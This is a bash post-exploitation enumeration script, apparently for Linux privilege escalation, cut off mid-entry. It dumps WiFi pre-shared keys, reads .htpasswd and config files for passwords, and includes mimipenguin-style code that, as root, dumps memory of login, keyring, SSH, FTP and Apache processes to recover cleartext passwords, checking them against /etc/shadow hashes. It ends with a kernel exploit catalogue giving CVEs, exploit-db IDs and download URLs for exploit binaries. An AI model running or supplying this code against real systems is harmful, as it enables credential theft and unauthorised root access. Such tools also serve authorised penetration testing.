echo -e "\n${BLUE}╔═════{ WiFi Creds:${XX}"
    ls -la /etc/NetworkManager/system-connections 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║There is a file for each connection with its configuration, also you need root privileges to read. However, the     ║"
        echo -e "\t║password isn't encrypted.                                                                                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Dump cleartext Pre-Shared Wireless Keys:${XX}"
    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
echo -e "\n${BLUE}╔═════{ Sensitive files:${XX}"
    ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║See if any listed files have weak file permission                                                                   ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ htpasswd:${XX}"
    find / -iname .htpasswd -print -exec cat {} \; 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║It is a flat-file used to store usernames and password. This file is generally used by the web server software like ║"
        echo -e "\t║Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are in ASCII text format.The    ║"
        echo -e "\t║hash maybe cracked using online tools or any cracking password tools.                                               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Firefox credentials:${XX}"
    if [ -f "/home/$USER/.mozilla/firefox 2>/dev/null" ]; 
        then
            ls -la /home/$USER/.mozilla/firefox 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Password files are:                                                                                                 ║"
                echo -e "\t║    key4.db                                                                                                         ║"
                echo -e "\t║    logins.json                                                                                                     ║"
                echo -e "\t║Read more about where Firefox stores your bookmarks, passwords and other user data:                                 ║"
                echo -e "\t║    https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data                                    ║"
                echo -e "\t║You can use firefox_decrypt.py tool:                                                                                ║"
                echo -e "\t║    https://github.com/unode/firefox_decrypt                                                                        ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else 
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Passwords in smb.conf file:${XX}"
    cat /etc/samba/smb.conf 2>/dev/null | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Find config.* files 'Excluded /var/ | /usr/':${XX}"
    find / -iname config.* 2>/dev/null | grep -v '/var/\|/usr/' | xargs ls -ld 2>/dev/null
echo -e "\n${BLUE}╔═════{ Apache2 credentials:${XX}"
    if [ -f /etc/apache2/apache2.conf ];
        then
        echo -e "\n${BLUE}    ══{ apache2.conf file permission:${XX}"
            ls -la /etc/apache2/apache2.conf
        echo -e "\n${BLUE}    ══{ Reading apache2.conf:${XX}"
            cat /etc/apache2/apache2.conf 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Read the full file for more inofrmation. Look for any password                                                      ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
     		echo -e "${RED}	File does not exist${XX}"
fi
echo -e "\n${BLUE}╔═════{ Configuration files that might contain sensitive information:${XX}"
    grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
echo -e "\n${BLUE}╔═════{ Cleartext Credentials in Memory:${XX}"
echo -e "${BLUE}    ══{ Thanks to mimipenguin:${XX}"
echo -e "${BLUE}    ══{ Download: https://github.com/huntergregal/mimipenguin ${XX}"
    root () { [ "$(id -u)" -eq 0 ]; }
    if root;
        then
        echo -e "${GREEN}        On Progress ....${XX}"
            export RESULTS=""
            command_exists () {
            command -v "${1}" >/dev/null 2>&1
            }
            if ! command_exists strings; 
            then
                echo "Error: command 'strings' not found in ${PATH}"
                exit 1
            fi
            if ! command_exists grep; 
            then
                echo "Error: command 'grep' not found in ${PATH}"
                exit 1
            fi
            if command_exists python2; 
            then
                pycmd=python2
            elif command_exists python2.7; 
            then
                pycmd=python2.7
            elif command_exists python3; 
            then
                pycmd=python3
            elif command_exists python3.6; 
            then
                pycmd=python3.6
            elif command_exists python3.7; 
            then
                pycmd=python3.7
            else
                echo "Error: No supported version of 'python' found in ${PATH}"
                exit 1
            fi
            function dump_pid () {
                system=$3
                pid=$1
                output_file=$2
                if [[ $system == "kali" ]]; 
                then
                    mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | grep -E 'heap|stack' | cut -d' ' -f 1)
                else
                    mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1)
                fi
                while read -r memrange; 
                do
                    memrange_start=$(echo "$memrange" | cut -d"-" -f 1)
                    memrange_start=$(printf "%u\n" 0x"$memrange_start")
                    memrange_stop=$(echo "$memrange" | cut -d"-" -f 2)
                    memrange_stop=$(printf "%u\n" 0x"$memrange_stop")
                    memrange_size=$((memrange_stop - memrange_start))
                    dd if=/proc/"$pid"/mem of="${output_file}"."${pid}" ibs=1 oflag=append conv=notrunc \
                        skip="$memrange_start" count="$memrange_size" > /dev/null 2>&1
                done <<< "$mem_maps"
            }
            function parse_pass () {
                if [[ ! "$2" ]]; 
                then
                        SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
                fi
                while read -r line; 
                do
                    if [[ "$2" ]]; 
                    then
                        CTYPE="$(echo "$2" | cut -c-3)"
                        SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
                        CRYPT="\"$SAFE\", \"$CTYPE$3\""
                        if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$2" ]]; 
                        then
                            USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
                            export RESULTS="$RESULTS$4          $USER:$line \n"
                        fi
                    elif [[ $SHADOWHASHES ]]; 
                    then
                        while read -r thishash; 
                        do
                            CTYPE="$(echo "$thishash" | cut -c-3)"
                            SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
                            SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
                            CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
                            if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$thishash" ]]; 
                            then
                                USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
                                export RESULTS="$RESULTS$4          $USER:$line\n"
                            fi
                        done <<< "$SHADOWHASHES"
                    else
                    patterns=("^_pammodutil.+[0-9]$"\
                            "^LOGNAME="\
                            "UTF-8"\
                            "^splayManager[0-9]$"\
                            "^gkr_system_authtok$"\
                            "[0-9]{1,4}:[0-9]{1,4}:"\
                            "Manager\.Worker"\
                            "/usr/share"\
                            "/bin"\
                            "\.so\.[0-1]$"\
                            "x86_64"\
                            "(aoao)"\
                            "stuv")
                    export RESULTS="$RESULTS[HIGH]$4            $line\n"
                    for pattern in "${patterns[@]}"; 
                    do
                    if [[ $line =~ $pattern ]]; 
                    then
                        export RESULTS="$RESULTS[LOW]$4         $line\n"
                    fi
                    done
                    fi
                done <<< "$1"
            }
            if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; 
            then
                SOURCE="[SYSTEM - GNOME]"
                PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk -F ' ' '{ print $1 }')"
                if [[ $PID ]];
                then
                    while read -r pid; 
                    do
                        dump_pid "$pid" /tmp/dump "kali"
                        HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                        SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                        DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
                        DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | grep -E '^gkr_system_authtok$' -B 5 -A 5)"
                        DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                        parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
                        rm -rf "/tmp/dump.${pid}"
                    done <<< "$PID"
                fi
            fi
            if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; 
            then
                    SOURCE="[SYSTEM - GNOME]"
                    PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk -F ' ' '{ print $1 }')"
                if [[ $PID ]];
                then
                    while read -r pid; 
                    do
                        dump_pid "$pid" /tmp/dump
                        HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                        SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                        DUMP=$(strings "/tmp/dump.${pid}" | grep -E '^.+libgck\-1\.so\.0$' -B 10 -A 10)
                        DUMP+=$(strings "/tmp/dump.${pid}" | grep -E -A 5 -B 5 'libgcrypt\.so\..+$')
                        DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                        parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
                        rm -rf "/tmp/dump.${pid}"
                    done <<< "$PID"
                fi
            fi
            if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-child) ]]; 
            then
                SOURCE="[SYSTEM - LIGHTDM]"
                PID="$(ps -eo pid,command | grep lightdm | sed -rn '/session\-child/p' | awk -F ' ' '{ print $1 }')"
                if [[ $PID ]]; 
                then
                    while read -r pid; 
                    do
                        dump_pid "$pid" /tmp/dump
                        HASH=$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')
                        SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                        DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getspnam_' -A1)"
                        DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                        parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
                        rm -rf "/tmp/dump.${pid}"
                    done <<< "$PID"
                fi
            fi
            if [[ -e "/etc/vsftpd.conf" ]]; 
            then
                    SOURCE="[SYSTEM - VSFTPD]"
                    PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk -F ' ' '{ print $1 }')"
                if [[ $PID ]];
                then
                    while read -r pid; 
                    do
                        dump_pid "$pid" /tmp/vsftpd
                        HASH="$(strings "/tmp/vsftpd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                        SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                        DUMP=$(strings "/tmp/vsftpd.${pid}" | grep -E -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
                        DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                        parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
                    done <<< "$PID"
                    rm -rf /tmp/vsftpd*
                fi
            fi
            if [[ -e "/etc/apache2/apache2.conf" ]]; 
            then
                    SOURCE="[HTTP BASIC - APACHE2]"
                    PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
                if [[ "$PID" ]];
                then
                    while read -r pid; 
                    do
                        gcore -o /tmp/apache "$pid" > /dev/null 2>&1
                    done <<< "$PID"
                    DUMP="$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
                    while read -r encoded; 
                    do
                        CREDS="$(echo "$encoded" | base64 -d)"
                        if [[ "$CREDS" ]]; 
                        then
                            export RESULTS="$RESULTS$SOURCE         $CREDS\n"
                        fi
                    done <<< "$DUMP"
                    rm -rf /tmp/apache*
                fi
            fi
            if [[ -e "/etc/ssh/sshd_config" ]]; 
            then
                SOURCE="[SYSTEM - SSH]"
                PID="$(ps -eo pid,command | grep -E 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
                if [[ "$PID" ]];
                then
                    while read -r pid; 
                    do
                        dump_pid "$pid" /tmp/sshd
                        HASH="$(strings "/tmp/sshd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
                        SALT="$(echo "$HASH" | cut -d'$' -f 3)"
                        DUMP=$(strings "/tmp/sshd.${pid}" | grep -E -A 3 '^sudo.+')
                        DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
                        parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
                    done <<< "$PID"
                    rm -rf /tmp/sshd.*
                fi
            fi
            printf "        MimiPenguin Results:\n"
            printf "%b" "$RESULTS" | sort -u
            unset RESULTS
    else
        echo -e "${RED}	Permission Denied${XX}"
    fi
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════════[ System Information ]═════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ kernel version & operating system architecture:${XX}"
    uname -a 2>/dev/null
echo -e "\n${BLUE}╔═════{ Kernal Exploit:${XX}"
echo -e "${BLUE}    ══{ Supported by linux-exploit-suggester:${XX}"
echo -e "${BLUE}    ══{ Download from: https://github.com/mzet-/linux-exploit-suggester.git ${XX}"
    UNAME_A=""
    KERNEL=""
    OS=""
    DISTRO=""
    ARCH=""
    PKG_LIST=""
    KCONFIG=""
    CVELIST_FILE=""
    opt_fetch_bins=false
    opt_fetch_srcs=false
    opt_kernel_version=false
    opt_uname_string=false
    opt_pkglist_file=false
    opt_cvelist_file=false
    opt_checksec_mode=false
    opt_full=false
    opt_summary=false
    opt_kernel_only=false
    opt_userspace_only=false
    opt_show_dos=false
    opt_skip_more_checks=false
    opt_skip_pkg_versions=false
    ARGS=
    SHORTOPTS="hVfbsu:k:dp:g"
    LONGOPTS="help,version,full,fetch-binaries,fetch-sources,uname:,kernel:,show-dos,pkglist-file:,short,kernelspace-only,userspace-only,skip-more-checks,skip-pkg-versions,cvelist-file:,checksec"
    declare -a EXPLOITS
    declare -a EXPLOITS_USERSPACE
    declare -a exploits_to_sort
n=0
EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2004-1235 } ${XX} elflbl
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/elflbl
exploit-db: 744
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2004-1235 } ${XX} uselib()
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
exploit-db: 778
Comments: Known to work only for 2.4 series (even though 2.6 is also vulnerable)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2004-1235 } ${XX} krad3
Reqs: pkg=linux-kernel,ver>=2.6.5,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 1397
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2004-0077 } ${XX} mremap_pte
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.2
Tags:
Rank: 1
exploit-db: 160
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2006-2451 } ${XX} raptor_prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2031
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2006-2451 } ${XX} prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2004
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2006-2451 } ${XX} prctl2
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2005
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2006-2451 } ${XX} prctl3
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2006
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2006-2451 } ${XX} prctl4
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2011
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2006-3626 } ${XX} h00lyshit
Reqs: pkg=linux-kernel,ver>=2.6.8,ver<=2.6.16
Tags:
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/h00lyshit
exploit-db: 2013
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2008-0600 } ${XX} vmsplice1
Reqs: pkg=linux-kernel,ver>=2.6.17,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5092
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2008-0600 } ${XX} vmsplice2
Reqs: pkg=linux-kernel,ver>=2.6.23,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5093
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2008-4210 } ${XX} ftrex
Reqs: pkg=linux-kernel,ver>=2.6.11,ver<=2.6.22
Tags:
Rank: 1
exploit-db: 6851
Comments: world-writable sgid directory and shell that does not drop sgid privs upon exec (ash/sash) are required
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2008-4210 } ${XX} exit_notify
Reqs: pkg=linux-kernel,ver>=2.6.25,ver<=2.6.29
Tags:
Rank: 1
exploit-db: 8369
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2692 } ${XX} sock_sendpage (simple version)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=7.10,RHEL=4,fedora=4|5|6|7|8|9|10|11
Rank: 1
exploit-db: 9479
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2692,CVE-2009-1895 } ${XX} sock_sendpage
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=9.04
Rank: 1
analysis-url: https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9435.tgz
exploit-db: 9435
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2692,CVE-2009-1895 } ${XX} sock_sendpage2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: 
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9436.tgz
exploit-db: 9436
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2692,CVE-2009-1895 } ${XX} sock_sendpage3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: 
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9641.tar.gz
exploit-db: 9641
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2692,CVE-2009-1895 } ${XX} sock_sendpage (ppc)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=8.10,RHEL=4|5
Rank: 1
exploit-db: 9545
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2698 } ${XX} the rebel (udp_sendmsg)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19
Tags: debian=4
Rank: 1
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9574.tgz
exploit-db: 9574
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: spender
Comments: /proc/sys/vm/mmap_min_addr needs to equal 0 OR pulseaudio needs to be installed
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2698 } ${XX} hoagie_udp_sendmsg
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: debian=4
Rank: 1
exploit-db: 9575
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: andi
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2698 } ${XX} katon (udp_sendmsg)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: debian=4
Rank: 1
src-url: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/raw/master/2009/CVE-2009-2698/katon.c
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: VxHell Labs
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-2698 } ${XX} ip_append_data
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: fedora=4|5|6,RHEL=4
Rank: 1
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
exploit-db: 9542
author: p0c73n1
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-3547 } ${XX} pipe.c 1
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 33321
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-3547 } ${XX} pipe.c 2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 33322
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2009-3547 } ${XX} pipe.c 3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 10018
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-3301 } ${XX} ptrace_kmod2
Reqs: pkg=linux-kernel,ver>=2.6.26,ver<=2.6.34
Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/kmod2
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/ptrace-kmod
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/ptrace_kmod2-64
exploit-db: 15023
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-1146 } ${XX} reiserfs
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.34
Tags: ubuntu=9.10
Rank: 1
analysis-url: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
src-url: https://jon.oberheide.org/files/team-edward.py
exploit-db: 12130
comments: Requires a ReiserFS filesystem mounted with extended attributes
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-2959 } ${XX} can_bcm
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.36
Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
Rank: 1
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/can_bcm
exploit-db: 14814
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-3904 } ${XX} rds
Reqs: pkg=linux-kernel,ver>=2.6.30,ver<2.6.37
Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
Rank: 1
analysis-url: http://www.securityfocus.com/archive/1/514379
src-url: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds64
exploit-db: 15285
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-3848,CVE-2010-3850,CVE-2010-4073 } ${XX} half_nelson
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
Rank: 1
bin-url: http://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/half-nelson3
exploit-db: 17787
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ N/A } ${XX} caps_to_root
Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36,x86
Tags: ubuntu=10.10
Rank: 1
exploit-db: 15916
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ N/A } ${XX} caps_to_root 2
Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36
Tags: ubuntu=10.10
Rank: 1
exploit-db: 15944
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-4347 } ${XX} american-sign-language
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags:
Rank: 1
exploit-db: 15774
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-3437 } ${XX} pktcdvd
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=10.04
Rank: 1
exploit-db: 15150
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2010-3081 } ${XX} video4linux
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.33
Tags: RHEL=5
Rank: 1
exploit-db: 15024
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2012-0056 } ${XX} memodipper
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=3.1.0
Tags: ubuntu=(10.04|11.10){kernel:3.0.0-12-(generic|server)}
Rank: 1
analysis-url: https://git.zx2c4.com/CVE-2012-0056/about/
src-url: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper64
exploit-db: 18411
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2012-0056,CVE-2010-3849,CVE-2010-3850 } ${XX} full-nelson
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
Rank: 1
src-url: http://vulnfactory.org/exploits/full-nelson.c
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson64
exploit-db: 15704
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2013-1858 } ${XX} CLONE_NEWUSER|CLONE_FS
Reqs: pkg=linux-kernel,ver=3.8,CONFIG_USER_NS=y
Tags: 
Rank: 1
src-url: http://stealth.openwall.net/xSports/clown-newuser.c
analysis-url: https://lwn.net/Articles/543273/
exploit-db: 38390
author: Sebastian Krahmer
Comments: CONFIG_USER_NS needs to be enabled 
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2013-2094 } ${XX} perf_swevent
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64
